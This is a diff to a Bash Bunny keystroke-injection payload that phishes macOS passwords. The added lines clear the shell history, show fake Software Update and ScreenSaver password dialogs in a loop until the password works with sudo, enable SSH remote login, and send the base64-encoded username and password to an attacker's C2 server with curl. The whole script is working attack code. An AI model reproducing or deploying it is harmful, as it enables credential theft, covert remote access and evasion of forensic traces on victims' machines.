@@ -1,15 +1,16 @@
 #!/bin/bash
 #
 # Title:         Mac Password Phisher
-# Author:        Ahhh
-# Version:       1.0
+# Author:        Ahhh & duffff
+# Version:       1.01
 #
-# Prompts for user password, writes response to the bunny 
+# Prompts for user password, writes response to the apache logs on your C2 instance
 #
 # Blue...............Starting
 # Amber..............Executing payload
 # Green..............Finished
-#
+# Thanks to '@FuzzyNop', '@harmj0y', '@enigma0x3', and '@Killswitch-GUI' for the techniques used in this script
+# If testing this script, you'll need to sudo -k to test more than once
 
 LED B
 
@@ -32,6 +33,9 @@ QUACK ENTER
 QUACK DELAY 400
 
 # Make lootdir
+# No need for a bash history during this session
+QUACK STRING unset HISTFILE
+QUACK ENTER
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/phish
 QUACK ENTER
 QUACK DELAY 200
@@ -44,9 +48,40 @@ QUACK ENTER
 QUACK DELAY 200
 QUACK ENTER
 
-# Execute Payload
-QUACK STRING osascript -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" \& return \& return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"\'\>logfile\; curl -A \`base64 -i logfile\` IPADDR\; sleep 20\; killall Terminal\;
+# Execute Payload (and it just keeps asking, and it just keeps asking, and it just keeps asking, until you get it right)
+QUACK STRING while true\; do
+QUACK ENTER
 
+# Test if we have the sudo password in logfile
+
+QUACK STRING cat logfile \| sudo -S ls
+QUACK ENTER
+
+# If the test for sudo succeeds: enable ssh, add the user to the host file, and send it off to your c2 server
+
+QUACK STRING if [ \"\$?\" -eq \"0\" ]\; then
+QUACK ENTER
+QUACK STRING sudo systemsetup -setremotelogin on
+QUACK ENTER
+QUACK STRING echo -n \"\:\" \$\(id -un\) \>\> logfile 
+QUACK ENTER
+
+# sends a GET request with the user agent, a base64'd value of the username and password
+
+QUACK STRING curl -A \`base64 -i logfile\` #YourIPaddressHere
+QUACK ENTER
+QUACK STRING rm -rf logfile
+QUACK ENTER
+QUACK STRING 
+QUACK STRING exit
+QUACK ENTER
+QUACK STRING fi
+QUACK ENTER
+
+# Screensaver phishing, saved locally to a file called logfile
+QUACK STRING osascript -e \'tell app \"ScreenSaverEngine\" to activate\' -e \'tell app \"ScreenSaverEngine\" to display dialog \"ScreenSaver requires your password to continue.\" \& return  default answer \"\" with icon 1 with hidden answer with title \"ScreenSaver Alert\"\' \| cut -f3 -d\"\:\" \> logfile
+QUACK ENTER
+QUACK STRING done
 QUACK ENTER
 QUACK DELAY 1000
 
